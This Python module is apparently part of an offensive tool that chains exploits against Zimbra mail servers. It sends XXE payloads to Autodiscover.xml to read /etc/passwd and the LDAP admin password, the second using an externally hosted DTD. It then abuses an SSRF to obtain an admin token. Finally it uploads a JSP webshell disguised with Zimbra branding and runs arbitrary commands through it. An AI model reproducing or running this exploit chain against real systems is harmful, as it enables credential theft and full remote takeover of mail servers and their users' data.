from typing import Literal
from urllib.parse import urlparse
from requests import get, post
from arbimz.src.config import props, get_user_agent
from rich import print
from re import compile, findall
from urllib3 import disable_warnings
disable_warnings()

# Used only to kill the program if webshell upload fail
import sys


def connect(url: str) -> None:
    " Basic connect function "

    response = get(url, **props)
    body: str = response.text

    if not response.ok:
        print(f"[red]> Error when connecting to {url}")

    return str(body)


def host_is_alive(args) -> None:
    " Try to access Autodiscover.xml file "

    print(f"[green]> Connected sucessfully with host: {args.url}[/]")
    
    xml_file_path: str = f"{args.url}Autodiscover/Autodiscover.xml"
    xml_request = get(xml_file_path, **props)

    print(f"[red]> Error when trying to access {xml_file_path}") if not xml_request.ok else read_passwd(xml_file_path, args)


def read_passwd(xml_file_path, args) -> None:
    " Read /etc/passwd with XXE vulnerability "

    if(args.kc):
        auth = args.kc
        auth = auth.split(":")
        username = auth[0]
        password = auth[1]
        print(f"[yellow]> Using credentials: [b]{username}:{password}[/] [/]\n")
        get_low_priv_token(username, password, args)

    passwd_payload: Literal = """
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
<Request>
<EMailAddress>aaaaa</EMailAddress>
<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
</Request>
</Autodiscover>
    """

    xxe_headers: dict = {
        'User-Agent': get_user_agent()
    }

    xxe_props: dict = {
        'verify': False,
        'allow_redirects': False,
        'data': passwd_payload,
        'headers': xxe_headers
    }

    passwd_request = post(xml_file_path, **xxe_props)
    passwd_response = passwd_request.text

    if '/bin/bash' in passwd_response:
        print("[green]> Zimbra vulnerable to XXE, collecting admin credentials[/]")
        get_credentials(xml_file_path, args)
    else:
        return print("[red]> Zimbra not vulnerable to XXE, stopping[/]")


def get_credentials(xml_file_path, args) -> None:
    " Get Zimbra admin credentials from config file "

    dtd_url: Literal = "https://raw.githubusercontent.com/q2971/Zimbra_rce/master/demo.dtd"

    credentials_payload: str = f"""
<!DOCTYPE Autodiscover [
<!ENTITY % dtd SYSTEM "{dtd_url}">
%dtd;
%all;
]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
</Autodiscover>
"""

    xxe_headers: dict = {
        'User-Agent': get_user_agent(),
        'Content-Type': 'application/xml'
    }

    xxe_props: dict = {
        'verify': False,
        'data': credentials_payload,
        'headers': xxe_headers
    }

    credentials_request = post(xml_file_path, **xxe_props)
    credentials_response: str = credentials_request.text

    re_username = compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
    re_password = compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")

    if re_username.findall(credentials_response) and re_password.findall(credentials_response):
        username: str = re_username.findall(credentials_response)[0][2]
        password: str = re_password.findall(credentials_response)[0][2]

        print("[green]> Credentials collected, generating low privileged token now...[/]")
        print(f"[yellow]> Username: {username} & Password: {password}[/]\n")

        get_low_priv_token(username, password, args)
    else:
        print("[red> Unable to get Zimbra credentials, check the body response:[/]")
        print(credentials_response)


def get_low_priv_token(username, password, args) -> None:
    " Simulate login in Zimbra SOAP service to generate low privileged token "
    
    soap_url: str = f"{args.url}service/soap"
    
    auth_request: str = f"""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="urn:zimbraAccount">
        <account by="adminName">{username}</account>
        <password>{password}</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
"""

    auth_headers: dict = {
        'User-Agent': get_user_agent(),
        'Content-Type': 'application/xml'
    }

    auth_props: dict = {
        'verify': False,
        'data': auth_request,
        'headers': auth_headers
    }

    auth_request = post(soap_url, **auth_props)
    auth_response = auth_request.text

    rgx_auth_token = compile(r"<authToken>(.*?)</authToken>")
    auth_token = rgx_auth_token.findall(auth_response)[0]
    size_token = len(auth_token)

    if auth_token:
        print(f"[green]> Low privileged token collected ({size_token}): {auth_token}\n")
        get_high_priv_token(username, password, auth_token, rgx_auth_token, args)
    else:
        print("[red> Unable to get low privileged token, check the body response:[/]")
        print(auth_response)


def get_high_priv_token(username, password, auth_token, rgx_auth_token, args) -> None:
    " Abuses SSRF vulnerability to generate a high privileged token "

    ssrf_url: str = f"{args.url}service/proxy?target=https://127.0.0.1:7071/service/admin/soap"
    localhost: str = urlparse(args.url).netloc.split(":")[0]

    high_priv_auth: str = f"""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="urn:zimbraAdmin">
        <account by="adminName">{username}</account>
        <password>{password}</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
    """

    high_priv_headers: dict = {
        'Cookie': f"ZM_ADMIN_AUTH_TOKEN={auth_token}",
        'User-Agent': get_user_agent(),
        'Host': f"{localhost}:7071"
    }

    high_priv_props: dict = {
        'verify': False,
        'headers': high_priv_headers
    }

    high_priv_request = post(ssrf_url, data=high_priv_auth, **high_priv_props)
    high_priv_response = high_priv_request.text

    high_priv_token = rgx_auth_token.findall(high_priv_response)[0]
    size_token: int = len(high_priv_token)

    if high_priv_token:
        print(f"[green]> High privileged token collected ({size_token}): {high_priv_token}\n")
        webshell_upload(high_priv_token, args)
    else:
        print("[red> Unable to get high privileged token, check the body response:[/]")
        print(high_priv_response)


def webshell_upload(high_priv_token, args) -> None:
    filename: str = "index.jsp"

    webshell_payload: Literal = """
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums.
Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>
    """

    upload_path: str = f"{args.url}service/extension/clientUploader/upload"
    shell_path: str = f"{args.url}downloads/index.jsp"

    print(f"[yellow]> Uploading webshell in {shell_path}")

    upload_settings: dict = {
        'filename1': (None, "index", None),
        'clientFile': (filename, webshell_payload, "text/plain"),
        'requestId': (None, "12", None)
    }

    upload_headers: dict = {
        'Cookie': f'ZM_ADMIN_AUTH_TOKEN={high_priv_token}',
        'User-Agent': get_user_agent(),
    }

    errors_list: dict = {
        "20000001": "[red]> Webshell upload failure: The request does not upload a file [/]",
        "20000002": "[red]> Webshell upload failure: Invalid directory for client repo or temporary files. [/]",
        "20000003": "[red]> Webshell upload failure: No write permission on directory for client repo or temporary files [/]",
        "20000004": "[red]> Webshell upload failure: Failed to save the upload file [/]",
        "20000003": "[red]> Webshell upload failure: No write permission on directory for client repo or temporary files [/]",
        "20000005": "[red]> Webshell upload failure: Failed to parse the request [/]",
        "20000006": "[red]> Webshell upload failure: File size exceeds allowed max size [/]",
        "40000001": "[red]> Webshell upload failure: Have no permission to upload client software. [/]",
    }

    upload_request = post(upload_path, files=upload_settings, headers=upload_headers, verify=False)
    upload_response = upload_request.text

    for error, desc in errors_list.items():
        if error in upload_response:
            print(desc)
            sys.exit(1)

    if("(1,'null')" in upload_response):
        print(f"[green]> Webshell uploaded sucessfully! Link to access: {upload_path}")
        execute_command(upload_path, high_priv_token, args)
        

def execute_command(upload_path, high_priv_token, args) -> None:
    " Execute command on webshell to confirm RCE "

    command_headers = {
        'User-Agent': get_user_agent(),
        'Cookie': f"ZM_ADMIN_AUTH_TOKEN={high_priv_token}"
    }

    command_path = f"{upload_path}?cmd={args.cmd}"
    print("[yellow]> Executing [b]{args.cmd}[/] on target to confirm RCE[/]")

    command_request = get(command_path, headers=command_headers, verify=False)
    command_response = command_request.text

    if(len(command_response) > 0):
        print(f"[white]{command_response}[/]")
    else:
        print("[red]> No command output. [/]")